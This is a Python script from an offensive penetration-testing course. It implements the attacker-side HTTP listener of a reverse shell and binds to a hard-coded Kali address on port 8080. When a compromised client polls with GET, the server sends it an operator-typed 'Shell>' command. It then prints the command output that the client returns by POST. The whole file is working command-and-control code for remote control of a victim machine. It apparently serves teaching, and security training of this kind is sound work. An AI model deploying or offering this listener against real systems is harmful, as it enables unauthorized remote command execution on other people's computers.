# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2

import http.server

HOST_NAME = "192.168.0.152"
PORT_NUMBER = 8080

class MyHandler(http.server.BaseHTTPRequestHandler): # MyHandler defines what we should do when we receive a GET/POST

    def do_GET(self):

        command = input("Shell> ")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):

        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length']) #Define the length which means how many bytes the HTTP POST data contains, the length value has to be integer
        postVar = self.rfile.read(length)
        print(postVar.decode())

if __name__ == "__main__":

    # We start a server_class and create httpd object and pass our kali IP,port number and class handler(MyHandler)
    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    try:
        httpd.serve_forever() # start the HTTP server, however if we got ctrl+c we will Interrupt and stop the server
    except KeyboardInterrupt:
        print('[!] Server is terminated')
        httpd.server_close()
